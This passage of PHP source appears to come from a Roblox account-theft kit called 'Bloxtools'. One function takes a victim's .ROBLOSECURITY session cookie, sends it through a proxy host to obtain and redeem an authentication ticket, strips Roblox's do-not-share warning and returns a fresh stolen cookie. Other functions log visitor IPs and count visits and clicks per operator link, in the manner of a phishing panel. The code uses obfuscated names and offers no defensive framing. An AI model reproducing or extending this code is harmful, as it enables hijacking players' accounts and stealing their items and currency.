    $csrf = $matches[1];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://auth.api.robloxdev.cn/v1/authentication-ticket",
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            "content-type: application/json",
            "origin: https://www.roblox.com",
            "referer: https://www.roblox.com/",
            "cookie: .ROBLOSECURITY=" . $cookie,
            "x-csrf-token: " . $csrf
        ],
        CURLOPT_RETURNTRANSFER => true
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if (!preg_match("/rbx-authentication-ticket:\s*([^\s]+)/i", $response, $matches)) {
        return ["success" => false, "cookie" => null];
    };
    $ticket = $matches[1];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://auth.api.robloxdev.cn/v1/authentication-ticket/redeem",
        CURLOPT_POST => true,
        CURLOPT_HEADER => true,
        CURLOPT_HTTPHEADER => [
            "content-type: application/json",
            "origin: https://www.roblox.com",
            "referer: https://www.roblox.com/",
            "x-csrf-token: " . $csrf,
            "RBXAuthenticationNegotiation: 1"
        ],
        CURLOPT_POSTFIELDS => json_encode(["authenticationTicket" => $ticket]),
        CURLOPT_RETURNTRANSFER => true
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    if (!preg_match("/\.ROBLOSECURITY=([^;]+)/", $response, $matches)) {
        return ["success" => false, "cookie" => null];
    };
    $cookie = str_replace(
        "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", 
        "", 
        $matches[1]
    );
    return ["success" => !empty($cookie), "cookie" => $cookie];
};

function ip() 
{
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}


function visits($a27) {
    $xa = connect();
    
    $r8a = "SELECT token FROM Tokens WHERE directory = ?";
    $re = $xa->prepare($r8a);
    $re->bind_param("s", $a27);
    $re->execute();
    $t21 = $re->get_result();
    
    if ($t21->num_rows > 0) {
        $i26 = $t21->fetch_assoc();
        $p1f = $i26['token'];

        $c8b = date('Y-m-d');
        $g8c = "INSERT INTO Visits (id, `for`, date) VALUES (1, ?, ?)";
        $j8d = $xa->prepare($g8c);
        $j8d->bind_param("ss", $p1f, $c8b);
        $j8d->execute();
        
        return $p1f;
    } else {
        return null;
    }
}

function clicks($a27) {
    $xa = connect();
    
    $r8a = "SELECT token FROM Tokens WHERE directory = ?";
    $re = $xa->prepare($r8a);
    $re->bind_param("s", $a27);
    $re->execute();
    $t21 = $re->get_result();
    
    if ($t21->num_rows > 0) {
        $i26 = $t21->fetch_assoc();
        $p1f = $i26['token'];

        $c8b = date('Y-m-d');
        $g8c = "INSERT INTO Clicks (id, `for`, date) VALUES (1, ?, ?)";
        $j8d = $xa->prepare($g8c);
        $j8d->bind_param("ss", $p1f, $c8b);
        $j8d->execute();
        
        return $p1f;
    } else {
        return null;
    }
}

function home()
{
    if (!isset($_COOKIE['Session'])) {
        return [
            'name' => 'Bloxtools',
            'directory' => 'https://' . $_SERVER['HTTP_HOST']
        ];
    }

    $k8e = $_COOKIE['Session'];
    $xa = connect();
    
    $re = $xa->prepare("SELECT name, directory FROM Tokens WHERE directory = ?");
    $re->bind_param("s", $k8e);
    $re->execute();
    
    $t21 = $re->get_result();
    $t1e = $t21->fetch_assoc();
    
    $re->close();
    $xa->close();
    
    if (!$t1e) {
        return [
            'name' => 'Bloxtools',
            'directory' => 'https://' . $_SERVER['HTTP_HOST'] . '/t/main/'
        ];
    }
    
    return [
        'name' => $t1e['name'],
        'directory' => 'https://' . $_SERVER['HTTP_HOST'] . '/t/' . $t1e['directory']
    ];
}

